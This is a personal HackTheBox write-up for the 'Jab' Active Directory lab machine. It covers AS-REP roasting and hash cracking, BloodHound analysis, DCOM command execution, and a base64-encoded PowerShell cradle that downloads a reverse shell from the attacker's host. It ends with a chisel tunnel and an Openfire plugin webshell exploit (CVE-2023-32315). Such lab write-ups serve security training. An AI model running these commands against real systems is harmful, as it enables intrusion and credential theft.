
https://www.hackthebox.com/achievement/machine/1777380/589
- **Abuse misconfigured Openfire registration** to enumerate users.
- **Perform Kerberoasting** to retrieve a **service account password**.
- **Extract plaintext credentials** from **chat room messages**.
- **Use DCOM privileges** to gain **local access on the DC**.
- **Upload a malicious plugin** to escalate to **SYSTEM privileges**


## Enumeration
10.10.11.4

```bash
┌──(pwn㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- -T4 10.10.11.4      
```
-edit /etc/hosts
-alot of ports open
10.10.11.4      jab.htb
10.10.11.4      DC01.jab.htb

---

## **foundings**
Jetty is a **lightweight, Java-based web server** and **servlet container** often used for hosting web applications.

Openfire, the **XMPP chat server**, uses Jetty as its built-in web server to host the **administration panel** (usually found on port **9090 or 7070**).

XMPP is an open communication protocol for **instant messaging (IM)**

Jabber is an **instant messaging platform** based on **XMPP**. It allows communication within organizations and is commonly deployed alongside Openfire.

**Jabber and XMPP are the same protocol**. The only difference is that Jabber is a trademarked name and XMPP is the official name of the protocol.
```bash
-sock5 open port
7777/tcp  open  socks5      
-http serevr at 7070 nothing found
```
-interact with xmpp !!
```bash
pidgin ?
```
![[Pasted image 20250211135343.png]]

![[Pasted image 20250211135503.png]]

![[Pasted image 20250211135947.png]]
-found chat room
-user == `bdavis`
-indicator of how the domain names is being established
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ ./kerbrute userenum -d jab.htb --dc 10.10.11.4 user 
```

![[Pasted image 20250211140425.png]]
![[Pasted image 20250211140733.png]]

-there is a lot of users
-its not copyable
-we can set proxy
-jmontgomery
-lbradford
-mlowe
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 GetNPUsers.py jab.htb/ -usersfile /home/pwn/jab/user.txt  -format hashcat -dc-ip 10.10.11.4 -dc-host dc01.jab.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$jmontgomery@JAB.HTB:d7f4e32f5503df46d963f7c730162254$3b326527b28ec8aa60d27703939b5ba3c427de067f39fd67ff7cd137d7339ac2967ecdcd1826104cd07db63f7d4093ea61c8af520288fda767f09381b3d680a50f8a4f59fcc665ddd4c883bfcf3b2dd661882807ac146bd0196b9e4790b2598c09ce0d8115e8ea790632bae035e4e1c61c809e26395f524cf55771c3c2737b7e1a2c1f60dee29b8b6daca45c4119057f737b38cdf3e92100224991b11a7a9a2498438a4ce1786fa9b263f93e1d8963e7a34e8733350866557b2c8f0c81296ed2b014d9fc00a64741c349f8de2c28400e0379f0b674da9c75c59110c8adb9ebaa93ed
$krb5asrep$23$lbradford@JAB.HTB:ebf6d382ad412c6fb6361cc08852e6da$8e01130db1083e6aa175e1b7414c653f01d5bff6b4c7361541e16473cc6dc75d40a60d46bbc5c8458e36a8e5abd4e51fc9c7d99a84857f4984facf5433377f9d4c79e728e96deb5fe5ccf809b4e980dbdd50dfec16daf1ae386498458697568ddac9d9bcafaa44e6e5a65a0abdae747f2c449b04b16c8eb5cd9b68f096339b8e8d1249c293c96f8f74603cc09f437432dccfec6b03ae044043d517c571283744dc806f5f2aae0ffd3ca8d1fc1f60c06abd88e273232763dc2afa7aa11bb8db0fc6efff519f3b0c4b53110528781da9ac0bf5de451945f9eb10cea6e8ee8b70633b7c
$krb5asrep$23$mlowe@JAB.HTB:1f71f379734c6d477b5538f801414ebe$22dbfc300b2b38f221dc0a1cae6e205c276645a992efc233a4eb60f91495540ddaea3203d22238cff95e97aec36c8fe1d1487c84506ed41636d172b3a937879f0d9b99d0c2c1b5b2327ffa6ee32fe4e12f1ebaa9a139fdfb0b8622cd151b99bab864972260356e1cc99a0ef40a02ad1af27bb8c8b88a5823e7e4a0448d3fc46ad07d6cd1ad98394f3d8f42b8df22a2e994a3357d05940df5efe0c87e535a9386bd13df3d3696ff5e8a457297f114f398c3b3ec73a9218ae2e796030c519c5641e8397dec8ee14bf807034503b2d18f6f03dd4c820aebbdcf788ce394a748540b7224

```
- This hash is from **an AS-REP response** from the **Domain Controller (DC)**.
- The hash is encrypted using the user's **NT hash (derived from their password)**.
- By cracking it, we are essentially **recovering the user's plaintext password**

```bash
hashcat -m 18200 asrep_hash.txt /path/to/wordlist.txt --force

$krb5asrep$23$jmontgomery@JAB.HTB:d7f4e32f5503df46d963f7c730162254$3b326527b28ec8aa60d27703939b5ba3c427de067f39fd67ff7cd137d7339ac2967ecdcd1826104cd07db63f7d4093ea61c8af520288fda767f09381b3d680a50f8a4f59fcc665ddd4c883bfcf3b2dd661882807ac146bd0196b9e4790b2598c09ce0d8115e8ea790632bae035e4e1c61c809e26395f524cf55771c3c2737b7e1a2c1f60dee29b8b6daca45c4119057f737b38cdf3e92100224991b11a7a9a2498438a4ce1786fa9b263f93e1d8963e7a34e8733350866557b2c8f0c81296ed2b014d9fc00a64741c349f8de2c28400e0379f0b674da9c75c59110c8adb9ebaa93ed:Midnight_121

jmontgomery
Midnight_121
```

```bash
┌──(pwn㉿kali)-[~]
└─$ bloodhound-python 

┌──(pwn㉿kali)-[~]
└─$ bloodhound-python -d jab.htb -c all -u jmontgomery -p Midnight_121 -ns 10.10.11.4 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)

`-c all`, BloodHound collects everything,
```
-in pidgin i added user jmontgomery
![[Pasted image 20250211154204.png]]

![[Pasted image 20250211154346.png]]
```bash

svc_openfire
!@#$%^&*(1qazxsw
```
-i ran bloodhound
```bash
jmontgomery mark as its owned
svc_openfire mark its owned
```
![[Pasted image 20250211160352.png]]

`ExecuteDCOM` allows an attacker to run commands remotely on this system.
There is a `DCSync` relationship, meaning the attacker can replicate AD secrets
### **Attack Path Summary**:

- **Step 1**: The attacker starts with an account that has `ExecuteDCOM` rights on a workstation/server.
- **Step 2**: Using this privilege, the attacker can gain execution on the workstation.
- **Step 3**: From this workstation, the attacker can escalate to a high-privilege user with `DCSync` rights.
- **Step 4**: The `DCSync` attack allows the attacker to extract password hashes for all users, including the domain administrator.


```bash
┌──(pwn㉿kali)-[~]
└─$ crackmapexec smb 10.10.11.4 -u svc_openfire -p '!@#$%^&*(1qazxsw' --exec-method mmcexec -x 'dir'
SMB         10.10.11.4      445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:jab.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.4      445    DC01             [+] jab.htb\svc_openfire:!@#$%^&*(1qazxsw 

```
#### **`--exec-method mmcexec`**
it needs admin but we are not
- Specifies the execution method as **MMCExec**:
    - MMCExec abuses the Microsoft Management Console (MMC) for command execution.
    - It is useful for bypassing certain security controls like **AMSI and AppLocker**.
    - Requires administrative privileges on the target

---

## `pwn`-user
```bash
┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3 dcomexec.py

┌──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ /usr/bin/impacket-dcomexec -object MMC20 jab.htb/svc_openfire@dc01.jab.htb 'ping -n 3 localhost' -debug -nooutput        
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
Password:!@#$%^&*(1qazxsw
[+] Target system is dc01.jab.htb and isFQDN is True
[+] StringBinding: DC01[60353]
[+] StringBinding chosen: ncacn_ip_tcp:dc01.jab.htb[60353]


```

```bash
┌──(pwn㉿kali)-[~/windows-post-exp]
└─$ cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 /home/pwn/jab
-edit the ip and port
```
-set up python web server 
```BASH
IEX (New-Object Net.WebClient).downloadString('http://10.10.14.2:8000/Invoke-PowerShellTcpOneLine.ps1')
execute directly in memory
- encode it
┌──(pwn㉿kali)-[~/jab]
└─$ cat shell.ps1 | iconv -t utf-16le|base64 -w 0
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAE8AbgBlAEwAaQBuAGUALgBwAHMAMQAnACkACgA=                                  

──(pwn㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ /usr/bin/impacket-dcomexec -object MMC20 jab.htb/svc_openfire@dc01.jab.htb 'powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADIAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwAE8AbgBlAEwAaQBuAGUALgBwAHMAMQAnACkACgA=' -debug -nooutput


```

![[Pasted image 20250211170326.png]]


## `pwn` -root
-management interfaces??
-we have server so we have to manage it so where are the panel or service to manage it
```bash
PS C:\users\svc_openfire\desktop> netstat -ano

  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3268
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3268

```
i mentioned above that
`host the **administration panel** (usually found on port **9090 or 7070**).`
-with that being said lets port forward

```bash
PS C:\users\svc_openfire\desktop>curl http://10.10.14.2:8000/chisel.exe -o chisel.exe                            e
PS C:\users\svc_openfire\desktop> 
PS C:\users\svc_openfire\desktop> dir


    Directory: C:\users\svc_openfire\desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        2/11/2025   9:10 AM        9760768 chisel.exe                                                            
-ar---        2/11/2025   4:45 AM             34 user.txt 

```

```bash
┌──(pwn㉿kali)-[~/windows-post-exp]
└─$ chisel server --reverse --port 8001
2025/02/11 09:11:45 server: Reverse tunnelling enabled
2025/02/11 09:11:45 server: Fingerprint QrKa2FPwqTx4nONigHRiSnh2hVP+7Pr4SnWo6x00fD8=
2025/02/11 09:11:45 server: Listening on http://0.0.0.0:8001

```

```bash
PS C:\users\svc_openfire\desktop> .\chisel client 10.10.14.2:8001 R:9090:127.0.0.1:9090

```

![[Pasted image 20250211171640.png]]
login
!@#$%^&*(1qazxsw
svc_openfire

after login there is uplaod plug in
-rce ??
https://github.com/miko550/CVE-2023-32315
```bash

https://github.com/miko550/CVE-2023-32315
┌──(pwn㉿kali)-[~/jab]
└─$ wget https://github.com/miko550/CVE-2023-32315/blob/main/openfire-management-tool-plugin.jar
--2025-02-11 09:20:49--  https://github.com/miko550/CVE-2023-32315/blob/main/openfire-management-tool-plugin.jar
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘openfire-management-tool-plugin.jar’

openfire-management-tool-plu     [  <=>                                        ] 220.61K   699KB/s    in 0.3s    

2025-02-11 09:20:51 (699 KB/s) - ‘openfire-management-tool-plugin.jar’ saved [225900]

┌──(pwn㉿kali)-[~/jab]
└─$ ls
hashes.txt  Invoke-PowerShellTcpOneLine.ps1  openfire-management-tool-plugin.jar  shell.ps1  user.txt
```

-after upload
Step

    Run exploit
    login with newly added user
    goto tab plugin > upload plugin openfire-management-tool-plugin.jar
    goto tab server > server settings > Management tool
    Access websehll with password "123"

![[Pasted image 20250211173205.png]]

![[Pasted image 20250211173054.png]]